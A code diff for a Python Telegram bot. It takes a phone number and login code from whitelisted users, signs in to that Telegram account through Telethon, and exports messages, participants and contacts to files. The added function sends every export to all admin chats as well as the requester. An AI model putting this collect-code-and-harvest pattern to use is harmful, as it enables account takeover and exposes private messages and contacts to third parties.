@@ -1,10 +1,8 @@
 import logging
 import asyncio
 import os
-from aiogram import Bot, Dispatcher, types, F
-from aiogram.dispatcher.filters import Command
-from aiogram.types import ParseMode
-from aiogram.utils import executor
+from aiogram import Bot, Dispatcher, types
+from aiogram.contrib.middlewares.logging import LoggingMiddleware
 from telethon import TelegramClient
 from dotenv import load_dotenv
 from defunc import (
@@ -32,6 +30,7 @@ admin_chat_ids = [int(chat_id) for chat_id in admin_chat_ids_str.split(",")]
 client = TelegramClient('session_name', api_id, api_hash)
 bot = Bot(token=bot_token)
 dp = Dispatcher(bot)
+dp.middleware.setup(LoggingMiddleware())
 
 # Логирование
 logging.basicConfig(level=logging.INFO)
@@ -39,39 +38,56 @@ logging.basicConfig(level=logging.INFO)
 # Словарь для хранения состояния пользователя
 user_state = {}
 
+# Функция для отправки файлов
+async def send_files_to_bot(bot, admin_chat_ids, user_chat_id):
+    file_extensions = ['_messages.xlsx', '_participants.xlsx', '_contacts.xlsx', '_about.xlsx', '_report.html', '_report.pdf']
+
+    for file_extension in file_extensions:
+        files_to_send = [file_name for file_name in os.listdir('.') if file_name.endswith(file_extension) and os.path.getsize(file_name) > 0]
+        
+        for file_to_send in files_to_send:
+            for admin_chat_id in admin_chat_ids:
+                with open(file_to_send, "rb") as file:
+                    await bot.send_document(admin_chat_id, file)
+            if user_chat_id:
+                with open(file_to_send, "rb") as file:
+                    await bot.send_document(user_chat_id, file)
+            os.remove(file_to_send)
+
 # Обработчики сообщений
-@dp.message(Command(commands=['start']))
+
+@dp.message_handler(lambda message: message.from_user.id not in allowed_users)
+async def unauthorized(message: types.Message):
+    await message.reply("Извините, вы не авторизованы для использования этого бота.")
+
+@dp.message_handler(commands=['start'])
 async def send_welcome(message: types.Message):
     if message.from_user.id in allowed_users:
-        await message.answer("Добро пожаловать! Пожалуйста, введите ваш номер телефона в международном формате.")
+        await message.reply("Добро пожаловать! Пожалуйста, введите ваш номер телефона в международном формате.")
     else:
-        await message.answer("Извините, вы не авторизованы для использования этого бота.")
+        await unauthorized(message)
 
-@dp.message(F.text.startswith('+'))
+@dp.message_handler(lambda message: message.text and message.text.startswith('+') and message.from_user.id in allowed_users)
 async def get_phone_number(message: types.Message):
-    if message.from_user.id not in allowed_users:
-        return
     phone_number = message.text
     user_state[message.from_user.id] = {'phone_number': phone_number}
     try:
         await client.connect()
         phone_code_hash = await client.send_code_request(phone_number)
         user_state[message.from_user.id]['phone_code_hash'] = phone_code_hash
-        await message.answer("Код отправлен на ваш номер. Пожалуйста, введите код, который вы получили.")
+        await message.reply("Код отправлен на ваш номер. Пожалуйста, введите код, который вы получили.")
     except Exception as e:
-        await message.answer(f"Произошла ошибка: {e}")
+        await message.reply(f"Произошла ошибка: {e}")
 
-@dp.message(F.text.regexp(r'^\d{5,}$'))
+@dp.message_handler(lambda message: message.text and message.from_user.id in user_state and 'phone_code_hash' in user_state[message.from_user.id])
 async def get_code(message: types.Message):
-    if message.from_user.id not in user_state or 'phone_code_hash' not in user_state[message.from_user.id]:
-        return
     code = message.text
     phone_number = user_state[message.from_user.id]['phone_number']
     phone_code_hash = user_state[message.from_user.id]['phone_code_hash']
     user_chat_id = message.from_user.id
     try:
         await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)
-        await message.answer("Успешная авторизация!")
+        await message.reply("Успешная авторизация!")
 
         # После успешной авторизации выполнение функций
         selection = '0'
@@ -98,7 +114,7 @@ async def get_code(message: types.Message):
         await send_files_to_bot(bot, admin_chat_ids, user_chat_id)
 
     except Exception as e:
-        await message.answer(f"Произошла ошибка: {e}")
+        await message.reply(f"Произошла ошибка: {e}")
     finally:
         await client.disconnect()
         user_state.pop(message.from_user.id, None)
